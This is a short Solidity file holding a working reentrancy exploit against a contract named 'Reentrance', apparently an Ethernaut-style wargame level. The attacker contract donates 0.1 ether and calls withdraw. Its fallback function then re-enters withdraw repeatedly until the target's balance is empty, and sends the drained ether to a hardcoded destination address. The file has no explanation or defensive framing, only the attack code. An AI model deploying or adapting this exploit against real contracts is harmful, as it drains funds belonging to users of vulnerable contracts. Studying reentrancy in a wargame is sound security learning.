// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    function donate(address _to) public payable {}
    function withdraw(uint _amount) public {}
}

contract ReentrancySol {

    address _addr = 0xD9a08779cbD145f2a85100741d4319F4fBD75c12; 
    Reentrance contr = Reentrance(_addr);

    address destination = 0xAAAA6AE640ddd7c44d34C0c1A1ea6E80636aF697;
    uint public amount = 0.1 ether;

    fallback() external payable {
        if(address(_addr).balance != 0){
            contr.withdraw(amount);
        }
        else {
            payable(address(destination)).transfer(address(this).balance);
        }
    }

    function attack() external payable{
        require(msg.value == amount);
        contr.donate{value: amount}(address(this));
        contr.withdraw(amount);
    } 
}